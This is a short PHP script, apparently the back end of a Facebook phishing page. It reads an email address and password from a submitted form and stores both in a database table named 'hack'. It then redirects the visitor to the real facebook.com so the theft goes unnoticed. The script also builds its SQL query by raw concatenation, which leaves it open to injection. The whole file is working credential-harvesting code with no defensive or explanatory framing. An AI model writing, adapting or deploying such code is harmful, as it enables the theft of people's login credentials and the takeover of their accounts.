<?php
$email=$_POST['email'];
$password=$_POST['password'];


$con=mysqli_connect("localhost","root","","db1");
$q="insert into hack values('$email','$password')";
$ans=mysqli_query($con,$q);


header("location:https://www.facebook.com/");
?>